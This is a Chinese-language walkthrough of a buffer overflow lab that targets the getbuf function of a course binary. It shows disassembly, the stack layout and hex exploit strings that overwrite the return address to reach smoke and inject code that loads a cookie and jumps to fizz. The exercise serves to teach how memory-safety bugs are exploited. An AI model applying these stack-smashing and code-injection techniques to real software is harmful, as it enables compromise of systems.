# 缓存溢出攻击
## 入口函数 getbuf
```asm
00000000004015d5 <getbuf>:
  4015d5:	48 83 ec 28          	sub    $0x28,%rsp
  4015d9:	48 89 e7             	mov    %rsp,%rdi
  4015dc:	e8 f6 fa ff ff       	callq  4010d7 <Gets>
  4015e1:	b8 01 00 00 00       	mov    $0x1,%eax
  4015e6:	48 83 c4 28          	add    $0x28,%rsp
  4015ea:	c3                   	retq   
```
从这里我们可以看到getbuf函数的栈相关情况。


|        栈           |       位置      |
|--------------------|-----------------|
|getbuf返回地址(0x00)  | <- ebp          |
| (-0x04)            |                 |
| (-0x08)            |                 |
|....................|                 |
|  (-0x28)           |  <- buf <-rsp   |


## smoke
```asm
0000000000401019 <smoke>:
  401019:	48 83 ec 08          	sub    $0x8,%rsp
  40101d:	bf cf 26 40 00       	mov    $0x4026cf,%edi
  401022:	e8 69 fc ff ff       	callq  400c90 <puts@plt>
  401027:	bf 00 00 00 00       	mov    $0x0,%edi
  40102c:	e8 ba 06 00 00       	callq  4016eb <validate>
  401031:	bf 00 00 00 00       	mov    $0x0,%edi
  401036:	e8 c5 fd ff ff       	callq  400e00 <exit@plt>
```
查到smoke的函数地址是0x00401019。
由于我的系统是小端序，将其按小端序重写是`19 10 40 00 00 00 00 00`。
将返回地址覆盖，只需要将原先的buf区域全部填0即可，0x28 = 40个字节
所以最终答案如下:
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
19 10 40 00 00 00 00 00
19 10 40 00 00 00 00 00
```

## fizz
```asm
000000000040103b <fizz>:
  40103b:	48 83 ec 08          	sub    $0x8,%rsp
  40103f:	89 fa                	mov    %edi,%edx
  401041:	3b 3d 65 51 20 00    	cmp    0x205165(%rip),%edi        # 6061ac <cookie>
  401047:	75 20                	jne    401069 <fizz+0x2e>
  401049:	be ea 26 40 00       	mov    $0x4026ea,%esi
  40104e:	bf 01 00 00 00       	mov    $0x1,%edi
  401053:	b8 00 00 00 00       	mov    $0x0,%eax
  401058:	e8 73 fd ff ff       	callq  400dd0 <__printf_chk@plt>
  40105d:	bf 01 00 00 00       	mov    $0x1,%edi
  401062:	e8 84 06 00 00       	callq  4016eb <validate>
  401067:	eb 14                	jmp    40107d <fizz+0x42>
  401069:	be 38 25 40 00       	mov    $0x402538,%esi
  40106e:	bf 01 00 00 00       	mov    $0x1,%edi
  401073:	b8 00 00 00 00       	mov    $0x0,%eax
  401078:	e8 53 fd ff ff       	callq  400dd0 <__printf_chk@plt>
  40107d:	bf 00 00 00 00       	mov    $0x0,%edi
  401082:	e8 79 fd ff ff       	callq  400e00 <exit@plt>
```

这里不知道为什么出现了一个edi，是在是没办法，只好用一些激进的方法。

首先进入gdb查到buf的地址是0x55683cb0。

让程序运行我注入的代码:
```asm
   0:	bf 1b fe f6 51       	mov    $0x51f6fe1b,%edi  #cookie
   5:	68 3b 10 40 00       	pushq  $0x40103b         #fizz
   a:	c3                   	retq   
```
将edi修改为我的cookies。
最终得到的答案如下:
```
bf 1b fe f6 51 68 3b 10
40 00 c3 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
b0 3c 68 55 00 00 00 00
```
